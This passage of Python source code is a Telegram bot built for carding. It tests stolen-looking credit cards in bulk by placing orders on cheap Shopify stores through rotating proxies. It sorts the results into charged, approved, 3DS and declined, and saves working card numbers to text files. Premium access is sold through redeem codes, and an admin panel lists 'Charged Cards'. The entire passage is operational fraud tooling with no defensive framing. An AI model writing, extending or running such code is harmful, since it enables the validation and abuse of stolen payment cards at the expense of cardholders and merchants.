            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"┣ 📊 𝗧𝗲𝘀𝘁𝗲𝗱 ➜ {len(proxies)}\n"
            f"┣ ✅ 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 ➜ {len(working)}\n"
            f"┗ 💀 𝗗𝗲𝗮𝗱 ➜ {dead}"
        )
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id)
        except:
            bot.reply_to(message, result)

    else:
        bot.reply_to(message, f"❌ 𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱: /proxy {cmd}")

# ================= SITE ADD (AUTO FILTER $1-$20) =================
@bot.message_handler(commands=['add'])
def add_site_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "⚠️ Premium users only! Use /redeem to upgrade.")
        return
    
    sites = []
    if message.reply_to_message:
        if message.reply_to_message.document:
            try:
                file_info = bot.get_file(message.reply_to_message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                content = downloaded_file.decode('utf-8', errors='ignore')
                sites = extract_urls_from_text(content)
            except:
                bot.reply_to(message, "❌ Could not read file.")
                return
        elif message.reply_to_message.text:
            sites = extract_urls_from_text(message.reply_to_message.text)
    else:
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /add site.com 𝗼𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲")
            return
        sites = extract_urls_from_text(parts[1])
    
    if not sites:
        bot.reply_to(message, "❌ No valid sites found.")
        return
    
    existing = get_user_sites(user_id)
    existing_norm = {normalize_site_url(s) for s in existing}
    
    new_sites = []
    duplicate_sites = []
    for site in sites:
        n = normalize_site_url(site)
        if n in existing_norm:
            duplicate_sites.append(n)
        else:
            new_sites.append(n)
    
    new_sites = list(dict.fromkeys(new_sites))
    
    if not new_sites:
        bot.reply_to(message, f"❌ All sites already added. Duplicates: {len(duplicate_sites)}")
        return
    
    msg = bot.reply_to(message, f"🔍 Testing {len(new_sites)} sites (auto filter $1-${MAX_SITE_PRICE})...")
    
    working_sites = []
    dead_sites = []
    price_filtered = []
    tested = 0
    total = len(new_sites)
    
    def test_worker(site):
        nonlocal tested
        try:
            proxy_dict, p_raw = get_proxy_dict()
            proxy_str = None
            if proxy_dict:
                proxy_url = proxy_dict.get('http', '')
                if proxy_url:
                    proxy_str = proxy_url.replace('http://', '').replace('https://', '')
            
            product_info = get_product_info(site, proxy_str)
            release_proxy(p_raw)
            
            tested += 1
            
            if isinstance(product_info, dict) and product_info.get('variant_id'):
                price_val = float(product_info.get('price', '0'))
                if 1 <= price_val <= MAX_SITE_PRICE:
                    result = test_site_sync(site, proxy_str)
                    if result['status'] == 'alive':
                        working_sites.append(site)
                        save_user_site(user_id, site)
                        save_working_site(site)
                    else:
                        dead_sites.append(site)
                        save_dead_site(site)
                else:
                    price_filtered.append(site)
            else:
                dead_sites.append(site)
                save_dead_site(site)
            
            if tested % 5 == 0 or tested == total:
                try:
                    bot.edit_message_text(
                        f"🔍 Testing: {tested}/{total}\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ Added: {len(working_sites)}\n"
                        f"❌ Dead: {len(dead_sites)}\n"
                        f"💰 Over ${MAX_SITE_PRICE}: {len(price_filtered)}\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"⏳ Please wait...",
                        message.chat.id, msg.message_id
                    )
                except:
                    pass
        except Exception as e:
            dead_sites.append(site)
            tested += 1
    
    with ThreadPoolExecutor(max_workers=SITE_WORKERS) as executor:
        executor.map(test_worker, new_sites)
    
    result_msg = (
        f"✅ **Site Addition Complete!**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total Sites: {total}\n"
        f"💰 Auto Filter: $1-${MAX_SITE_PRICE}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Added (Working): {len(working_sites)}\n"
        f"❌ Dead: {len(dead_sites)}\n"
        f"💰 Over Price: {len(price_filtered)}\n"
        f"📌 Duplicates skipped: {len(duplicate_sites)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💾 Working sites saved to your list!"
    )
    
    if working_sites:
        result_msg += f"\n\n✅ **Added Sites ($1-${MAX_SITE_PRICE}):**"
        for s in working_sites[:10]:
            result_msg += f"\n┣ {s}"
        if len(working_sites) > 10:
            result_msg += f"\n┗ ... and {len(working_sites)-10} more"
    
    if price_filtered:
        result_msg += f"\n\n💰 **Over ${MAX_SITE_PRICE} (not added):**"
        for s in price_filtered[:5]:
            result_msg += f"\n┣ {s}"
        if len(price_filtered) > 5:
            result_msg += f"\n┗ ... and {len(price_filtered)-5} more"
    
    try:
        bot.edit_message_text(result_msg, message.chat.id, msg.message_id, parse_mode="Markdown")
    except Exception as e:
        try:
            bot.edit_message_text(result_msg, message.chat.id, msg.message_id)
        except:
            pass

# ================= REMOVE SITE =================
@bot.message_handler(commands=['rm'])
def remove_site_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    text = message.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /rm site.com 𝗼𝗿 /rm all")
        return
    
    arg = parts[1].strip().lower()
    if arg == 'all':
        sites = get_user_sites(user_id)
        if not sites:
            bot.reply_to(message, "📭 No sites to remove.")
            return
        for s in sites:
            remove_user_site(user_id, s)
        bot.reply_to(message, f"🗑️ Removed all {len(sites)} sites.")
        return
    
    sites_to_remove = extract_urls_from_text(arg)
    if not sites_to_remove:
        bot.reply_to(message, "❌ No valid sites found.")
        return
    
    removed = []
    for site in sites_to_remove:
        n = normalize_site_url(site)
        existing = get_user_sites(user_id)
        for ex in existing:
            if normalize_site_url(ex) == n:
                remove_user_site(user_id, ex)
                removed.append(ex)
                break
    
    bot.reply_to(message, f"🗑️ Removed {len(removed)} sites.")

# ================= LIST SITES =================
@bot.message_handler(commands=['sites'])
def list_sites_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    sites = get_user_sites(user_id)
    if not sites:
        bot.reply_to(message, "📭 No sites added. Use /add")
        return
    
    text = f"📋 **Your Sites ({len(sites)})**\n━━━━━━━━━━━━━━━━━\n"
    for i, s in enumerate(sites, 1):
        text += f"{i}. {s}\n"
    bot.reply_to(message, text)

# ================= TEST SITES =================
@bot.message_handler(commands=['site'])
def check_sites_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "⚠️ Premium users only!")
        return
    
    sites = get_user_sites(user_id)
    if not sites:
        bot.reply_to(message, "📭 No sites to check. Use /add")
        return
    
    msg = bot.reply_to(message, f"🔍 Checking {len(sites)} sites...")
    
    working = []
    dead = []
    tested = 0
    total = len(sites)
    
    def check_worker(site):
        nonlocal tested
        try:
            result = test_site_sync(site)
            tested += 1
            
            if result['status'] == 'alive':
                working.append(site)
            else:
                dead.append(site)
            
            if tested % 5 == 0 or tested == total:
                try:
                    bot.edit_message_text(
                        f"⏳ Checking: {tested}/{total}\n✅ Working: {len(working)}\n❌ Dead: {len(dead)}",
                        message.chat.id, msg.message_id
                    )
                except:
                    pass
        except:
            dead.append(site)
            tested += 1
    
    with ThreadPoolExecutor(max_workers=SITE_WORKERS) as executor:
        executor.map(check_worker, sites)
    
    result_msg = (
        f"✅ **Site Check Complete!**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total: {len(sites)}\n"
        f"✅ Working: {len(working)}\n"
        f"❌ Dead: {len(dead)}\n"
    )
    
    if working:
        result_msg += f"\n✅ **Working Sites:**"
        for s in working[:10]:
            result_msg += f"\n┣ {s}"
        if len(working) > 10:
            result_msg += f"\n┗ ... and {len(working)-10} more"
    
    if dead:
        result_msg += f"\n\n❌ **Dead Sites:**"
        for s in dead[:5]:
            result_msg += f"\n┣ {s}"
        if len(dead) > 5:
            result_msg += f"\n┗ ... and {len(dead)-5} more"
    
    try:
        bot.edit_message_text(result_msg, message.chat.id, msg.message_id)
    except:
        pass

# ================= SINGLE SHOPIFY CHECK (/sh) =================
@bot.message_handler(commands=['sh'])
def single_shopify_check(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    if not API_AVAILABLE:
        bot.reply_to(message, "❌ Shopify API not available. Missing api.py")
        return
    
    if ACTIVE_USERS_SH.get(user_id):
        bot.reply_to(message, "⏳ You already have a check running!")
        return
    
    if not proxy_list:
        bot.reply_to(message, "⚠️ No proxies available! Add proxies first.")
        return
    
    sites = get_user_sites(user_id)
    if not sites:
        sites = get_working_sites()
    if not sites:
        sites = get_global_sites()
    if not sites:
        bot.reply_to(message, "⚠️ No sites available! Use /add")
        return
    
    cc = None
    if len(message.text.split()) > 1:
        cc = message.text.split()[1].split('#')[0].strip()
    elif message.reply_to_message:
        target_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        match = re.search(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})', target_text)
        if match:
            cc = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
    
    if not cc:
        bot.reply_to(message, "📝 𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /sh 4111...|12|25|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝗖𝗖")
        return
    
    is_valid, error = validate_card_format(cc)
    if not is_valid:
        bot.reply_to(message, f"❌ {error}")
        return
    
    ACTIVE_USERS_SH[user_id] = True
    start_user_session(user_id, "single")
    
    anim_msg = bot.reply_to(message, "⏳ Processing...")
    
    for progress in range(0, 101, 10):
        try:
            frames = ["⏳", "🔄", "🔍", "⚡", "✨"]
            frame = frames[progress % len(frames)]
            bot.edit_message_text(
                f"{frame} **Checking Card...**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Progress: [{ '█' * (progress // 10)}{ '░' * (10 - (progress // 10))}] {progress}%\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Please wait...",
                message.chat.id, anim_msg.message_id,
                parse_mode="Markdown"
            )
            time.sleep(0.3)
        except:
            pass
    
    bin_code = cc[:6]
    brand_bin, bank, country, level, type_cc, flag = get_bin_info(bin_code)
    
    site = random.choice(sites)
    success, response, gateway, price, currency = False, "Error", "UNKNOWN", "0.00", "USD"
    price_display = "Free"
    
    for _ in range(MAX_RETRIES):
        proxy_dict = None
        p_raw = None
        proxy_dict, p_raw = get_proxy_dict()
        
        try:
            proxy_str = None
            if proxy_dict:
                proxy_url = proxy_dict.get('http', '')
                if proxy_url:
                    proxy_str = proxy_url.replace('http://', '').replace('https://', '')
            
            success, response, gateway, price, currency = check_card_shopify(cc, site, proxy_str)
            
            if not is_site_error(response):
                break
        except:
            pass
        finally:
            release_proxy(p_raw)
    
    if price and price != '0.00' and price != '0':
        try:
            price_display = f"${float(price):.2f}"
        except:
            price_display = "Free"
    
    category = classify_result(success, response)
    clean_response = extract_clean_response_shopify(response)
    
    if category == 'charged':
        clean_response = "ORDER_PLACED"
        status_font = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥"
        save_card_result(user_id, cc, "CHARGED", response, gateway, price_display, site)
        with open('Data/charged.txt', 'a', encoding="utf-8") as f:
            f.write(f"{cc} - {response}\n")
    elif category == 'tds':
        clean_response = "OTP_REQUIRED"
        status_font = "𝟯𝗗𝗦 ❎"
        save_card_result(user_id, cc, "3DS", response, gateway, price_display, site)
        with open('Data/3ds.txt', 'a', encoding="utf-8") as f:
            f.write(f"{cc} - {response}\n")
    elif category == 'approved':
        status_font = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
        save_card_result(user_id, cc, "APPROVED", response, gateway, price_display, site)
        with open('Data/approved.txt', 'a', encoding="utf-8") as f:
            f.write(f"{cc} - {response}\n")
    elif category == 'declined':
        status_font = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
        save_card_result(user_id, cc, "DECLINED", response, gateway, price_display, site)
    else:
        status_font = "𝗘𝗥𝗥𝗢𝗥"
        save_card_result(user_id, cc, "ERROR", response, gateway, price_display, site)

    is_p = " [𝗔𝗗𝗠𝗜𝗡]" if is_admin(user_id) else " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]" if is_premium(user_id) else " [𝗙𝗥𝗘𝗘]"
    safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
    
    if "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in clean_response:
        clean_response = "⚠️ DELIVERY ERROR - Try different site or proxy"
    
    res = f"""{status_font}
━━━━━━━━━━━━━━━━━
𝗖𝗮𝗿𝗱 ━ <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ━ {clean_response}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ━ Shopify Payments
𝗣𝗿𝗶𝗰𝗲 ━ {price_display}
━━━━━━━━━━━━━━━━━
𝗕𝗜𝗡: {brand_bin} | {type_cc} | {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
━━━━━━━━━━━━━━━━━
𝗨𝘀𝗲𝗿: {safe_fname}{is_p}
𝗗𝗲𝘃: @{BOT_USERNAME}"""
    
    try:
        bot.delete_message(message.chat.id, anim_msg.message_id)
    except: pass
    
    try:
        bot.reply_to(message, res, parse_mode="HTML")
    except:
        bot.reply_to(message, res.replace("<code>", "").replace("</code>", ""))
    
    ACTIVE_USERS_SH[user_id] = False
    end_user_session(user_id)

# ================= MASS SHOPIFY CHECK (/msh) =================
@bot.message_handler(commands=['msh'])
def mass_shopify_check(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    if not API_AVAILABLE:
        bot.reply_to(message, "❌ Shopify API not available. Missing api.py")
        return
    
    if ACTIVE_USERS_MSH.get(user_id):
        bot.reply_to(message, "⏳ Mass check already running! Use /stop to stop.")
        return
    
    if not proxy_list:
        bot.reply_to(message, "⚠️ No proxies available! Add proxies first.")
        return
    
    sites = get_user_sites(user_id)
    if not sites:
        sites = get_working_sites()
    if not sites:
        sites = get_global_sites()
    if not sites:
        bot.reply_to(message, "⚠️ No sites available! Use /add")
        return
    
    cards = []
    if len(message.text.split()) > 1:
        cards = extract_cc(message.text)
    elif message.reply_to_message:
        if message.reply_to_message.document:
            try:
                file_info = bot.get_file(message.reply_to_message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                content = downloaded_file.decode('utf-8', errors='ignore')
                cards = extract_cc(content)
            except:
                bot.reply_to(message, "❌ Could not read file.")
                return
        elif message.reply_to_message.text:
            cards = extract_cc(message.reply_to_message.text)
    
    if not cards:
        bot.reply_to(message, "❌ No valid cards found. Reply to a .txt file or paste cards.")
        return
    
    valid_cards = []
    invalid_count = 0
    for card in cards:
        is_valid, _ = validate_card_format(card)
        if is_valid:
            valid_cards.append(card)
        else:
            invalid_count += 1
    
    if invalid_count > 0:
        bot.reply_to(message, f"⚠️ Skipped {invalid_count} invalid cards.")
    
    if not valid_cards:
        bot.reply_to(message, "❌ No valid cards found.")
        return
    
    cards = valid_cards
    total = len(cards)
    
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MSH[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    start_user_session(user_id, "mass")
    
    is_p = " [𝗔𝗗𝗠𝗜𝗡]" if is_admin(user_id) else " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]" if is_premium(user_id) else " [𝗙𝗥𝗘𝗘]"
    
    results = {"approved": 0, "approved_list": [], "3ds": 0, "3ds_list": [], 
               "charged": 0, "charged_list": [], "declined": 0, "declined_list": [], 
               "error": 0, "error_list": [], "checked": 0}
    
    start_time = time.time()
    prog_msg = bot.reply_to(message, f"⏳ Processing {total} cards...")
    
    def update_loading():
        for progress in range(0, 101, 5):
            if not ACTIVE_JOBS.get(job_id):
                break
            try:
                frames = ["⏳", "🔄", "🔍", "⚡", "✨"]
                frame = frames[progress % len(frames)]
                bot.edit_message_text(
                    f"{frame} **Processing Mass Check...**\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"Progress: [{ '█' * (progress // 10)}{ '░' * (10 - (progress // 10))}] {progress}%\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"Cards: {results['checked']}/{total}\n"
                    f"✅ Approved: {results['approved']}  🔥 Charged: {results['charged']}\n"
                    f"❎ 3DS: {results['3ds']}  ❌ Declined: {results['declined']}",
                    message.chat.id, prog_msg.message_id,
                    parse_mode="Markdown"
                )
            except:
                pass
            time.sleep(0.5)
    
    loading_thread = threading.Thread(target=update_loading, daemon=True)
    loading_thread.start()
    
    def worker(cc):
        if not ACTIVE_JOBS.get(job_id):
            return
        
        site = random.choice(sites)
        success, response, gateway, price, currency = False, "Error", "UNKNOWN", "0.00", "USD"
        
        for _ in range(MAX_RETRIES):
            proxy_dict = None
            p_raw = None
            proxy_dict, p_raw = get_proxy_dict()
            
            try:
                proxy_str = None
                if proxy_dict:
                    proxy_url = proxy_dict.get('http', '')
                    if proxy_url:
                        proxy_str = proxy_url.replace('http://', '').replace('https://', '')
                success, response, gateway, price, currency = check_card_shopify(cc, site, proxy_str)
                if not is_site_error(response):
                    break
            except:
                pass
            finally:
                release_proxy(p_raw)
        
        category = classify_result(success, response)
        clean_response = extract_clean_response_shopify(response)
        price_display = f"${float(price):.2f}" if price and price != '0.00' and price != '0' else "Free"
        
        if category == 'charged':
            clean_response = "ORDER_PLACED"
            results["charged"] += 1
            results["charged_list"].append(f"{cc} - {clean_response}")
            save_card_result(user_id, cc, "CHARGED", response, gateway, price_display, site)
            with open('Data/charged.txt', 'a', encoding="utf-8") as f:
                f.write(f"{cc} - {response}\n")
        elif category == 'tds':
            clean_response = "OTP_REQUIRED"
            results["3ds"] += 1
            results["3ds_list"].append(f"{cc} - {clean_response}")
            save_card_result(user_id, cc, "3DS", response, gateway, price_display, site)
            with open('Data/3ds.txt', 'a', encoding="utf-8") as f:
                f.write(f"{cc} - {response}\n")
        elif category == 'approved':
            results["approved"] += 1
            results["approved_list"].append(f"{cc} - {clean_response}")
            save_card_result(user_id, cc, "APPROVED", response, gateway, price_display, site)
            with open('Data/approved.txt', 'a', encoding="utf-8") as f:
                f.write(f"{cc} - {response}\n")
        elif category == 'declined':
            results["declined"] += 1
            results["declined_list"].append(f"{cc} - {clean_response}")
            save_card_result(user_id, cc, "DECLINED", response, gateway, price_display, site)
        else:
            results["error"] += 1
            results["error_list"].append(f"{cc} - {clean_response}")
            save_card_result(user_id, cc, "ERROR", response, gateway, price_display, site)
        
        results["checked"] += 1
        update_session_cards(user_id)
        
        if category in ['charged', 'approved', 'tds']:
            bin_code = cc[:6]
            brand_bin, bank, country, level, type_cc, flag = get_bin_info(bin_code)
            status_f = "CHARGED 🔥" if category == 'charged' else "APPROVED ✅" if category == 'approved' else "3DS ❎"
            
            if "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in clean_response:
                clean_response = "⚠️ DELIVERY ERROR - Try different site or proxy"
            
            res_single = f"""{status_f}
━━━━━━━━━━━━━━━━━
𝗖𝗮𝗿𝗱 ━ <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ━ {clean_response}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ━ Shopify Payments
𝗣𝗿𝗶𝗰𝗲 ━ {price_display}
━━━━━━━━━━━━━━━━━
𝗕𝗜𝗡: {brand_bin} | {type_cc} | {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
━━━━━━━━━━━━━━━━━
𝗗𝗲𝘃: @{BOT_USERNAME}"""
            try:
                bot.send_message(message.chat.id, res_single, parse_mode="HTML")
                time.sleep(0.5)
            except:
                pass
    
    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        for cc in cards:
            if not ACTIVE_JOBS.get(job_id):
                break
            executor.submit(worker, cc)
    
    ACTIVE_JOBS.pop(job_id, None)
    ACTIVE_USERS_MSH[user_id] = False
    USER_ACTIVE_JOB.pop(user_id, None)
    end_user_session(user_id)
    
    elapsed = int(time.time() - start_time)
    mins, secs = divmod(elapsed, 60)
    final = (
        f"✅ **Mass Check Complete!**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total: {total}\n"
        f"⏱️ Time: {mins:02d}:{secs:02d}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Approved: {results['approved']}\n"
        f"🔥 Charged: {results['charged']}\n"
        f"❎ 3DS: {results['3ds']}\n"
        f"❌ Declined: {results['declined']}\n"
        f"⚠️ Errors: {results['error']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: {message.from_user.first_name}{is_p}\n"
        f"Dev: @{BOT_USERNAME}"
    )
    
    try:
        bot.edit_message_text(final, message.chat.id, prog_msg.message_id, parse_mode="Markdown")
    except:
        bot.edit_message_text(final.replace("*", ""), message.chat.id, prog_msg.message_id)

# ================= STOP COMMAND =================
@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    
    stopped = False
    
    job_id = USER_ACTIVE_JOB.get(user_id)
    if job_id and job_id in ACTIVE_JOBS:
        ACTIVE_JOBS[job_id] = False
        stopped = True
    
    if ACTIVE_USERS_SH.get(user_id):
        ACTIVE_USERS_SH[user_id] = False
        stopped = True
    
    if stopped:
        bot.reply_to(message, "🛑 **Stopped all active processes!**\n━━━━━━━━━━━━━━━━━\n✅ Mass check stopped\n✅ Single check stopped")
        end_user_session(user_id)
    else:
        bot.reply_to(message, "⚠️ No active processes found to stop.")

# ================= PROXY CHECK =================
@bot.message_handler(commands=['chkpxy'])
def check_proxies_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    if not is_admin(user_id) and not is_premium(user_id):
        bot.reply_to(message, "⚠️ Premium users only!")
        return
    
    if not proxy_list:
        bot.reply_to(message, "📭 No proxies to check.")
        return
    
    msg = bot.reply_to(message, f"🔍 Checking {len(proxy_list)} proxies...")
    
    working = []
    dead = []
    
    def test_worker(p):
        if test_proxy(p):
            working.append(p)
        else:
            dead.append(p)
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(test_worker, proxy_list)
    
    save_proxies(working)
    
    result = (
        f"✅ **Proxy Check Complete!**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total: {len(proxy_list)}\n"
        f"✅ Working: {len(working)}\n"
        f"❌ Dead: {len(dead)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💾 Working proxies saved."
    )
    
    try:
        bot.edit_message_text(result, message.chat.id, msg.message_id)
    except:
        bot.reply_to(message, result)

# ================= REDEEM COMMANDS =================
@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /redeem <code>")
        return
    
    code = parts[1].strip().upper()
    result = redeem_code(user_id, code)
    bot.reply_to(message, result)

@bot.message_handler(commands=['credeem'])
def create_redeem_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /credeem <days> <uses(optional)>")
        return
    
    try:
        days = int(parts[1])
        uses = int(parts[2]) if len(parts) > 2 else 1
        code = create_redeem_code(days, uses)
        
        res = f"""
✅ **Redeem Code Created**
━━━━━━━━━━━━━━━━━
📝 Code: `{code}`
⏰ Days: {days}
👥 Uses: {uses}
📅 Expires: {datetime.fromtimestamp(time.time() + (days * 86400)).strftime('%Y-%m-%d %H:%M')}
━━━━━━━━━━━━━━━━━
Share this code with users!
"""
        bot.reply_to(message, res, parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ Invalid format. Use: /credeem <days> <uses>")

@bot.message_handler(commands=['lredeem'])
def list_redeem_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    codes = list_redeem_codes()
    if not codes:
        bot.reply_to(message, "📭 No redeem codes found.")
        return
    
    res = "📋 **Redeem Codes**\n━━━━━━━━━━━━━━━━━\n" + "\n".join(codes)
    bot.reply_to(message, res, parse_mode='Markdown')

# ================= BROADCAST =================
def get_all_users():
    users = db_fetch("SELECT user_id FROM users")
    return [str(user[0]) for user in users]

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    bot.reply_to(message, "📢 **Broadcast Mode**\n\nSend me the message you want to broadcast.\nType /cancel to cancel.")
    bot.register_next_step_handler(message, process_broadcast)

def process_broadcast(message):
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "❌ Broadcast cancelled.")
        return
    
    users = get_all_users()
    if not users:
        bot.reply_to(message, "❌ No users found!")
        return
    
    status_msg = bot.reply_to(message, f"📢 Broadcasting to {len(users)} users...\n⏳ Progress: 0%")
    
    sent = 0
    failed = 0
    
    for i, uid in enumerate(users):
        try:
            if message.photo:
                bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption or "📢 Broadcast")
            elif message.document:
                bot.send_document(uid, message.document.file_id, caption=message.caption or "📢 Broadcast")
            elif message.video:
                bot.send_video(uid, message.video.file_id, caption=message.caption or "📢 Broadcast")
            else:
                bot.send_message(uid, f"📢 {message.text}")
            sent += 1
        except:
            failed += 1
        
        if i % 10 == 0:
            progress = int((i + 1) / len(users) * 100)
            try:
                bot.edit_message_text(
                    f"📢 Broadcasting to {len(users)} users...\n⏳ Progress: {progress}%\n✅ Sent: {sent}\n❌ Failed: {failed}",
                    message.chat.id, status_msg.message_id
                )
            except:
                pass
        
        time.sleep(0.05)
    
    bot.edit_message_text(
        f"✅ **Broadcast Complete!**\n━━━━━━━━━━━━━━━━━\n📊 Total: {len(users)}\n✅ Sent: {sent}\n❌ Failed: {failed}",
        message.chat.id, status_msg.message_id,
        parse_mode='Markdown'
    )

# ================= ADMIN COMMANDS =================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    stats = get_bot_stats()
    
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💰 Charged Cards", callback_data="admin_charged"),
        InlineKeyboardButton("👥 All Users", callback_data="admin_users")
    )
    kb.add(
        InlineKeyboardButton("🟢 Active Sessions", callback_data="admin_sessions"),
        InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")
    )
    kb.add(
